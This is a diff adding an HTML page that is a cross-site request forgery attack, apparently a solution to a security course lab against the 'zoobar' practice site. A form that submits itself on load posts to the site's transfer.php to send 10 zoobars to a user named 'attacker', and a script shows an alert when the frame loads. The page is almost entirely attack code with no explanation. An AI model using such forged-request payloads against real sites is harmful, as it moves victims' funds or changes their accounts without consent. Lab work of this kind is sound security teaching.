@@ -1,0 +1,26 @@
+<html>
+<head>
+</head>
+<body>
+	<iframe id="frame" name="frame">
+		<html>
+		<head>
+		</head>
+		<body>
+			<form id="attack" method="POST" target="frame" action="http://zoobar.org/transfer.php">
+				<input name="zoobars" type="text" value="10">
+				<input name="recipient" type="text" value="attacker">
+				<input type="submit" name="submission" value="Send">
+			</form>
+			<script>document.forms[0].submit();</script>
+		</body>
+		</html>
+	</iframe>
+	<script>
+		var frame = document.getElementById('frame');
+		frame.onload = function() {
+			alert("Frame loaded!")
+		};
+	</script>
+</body>
+</html>
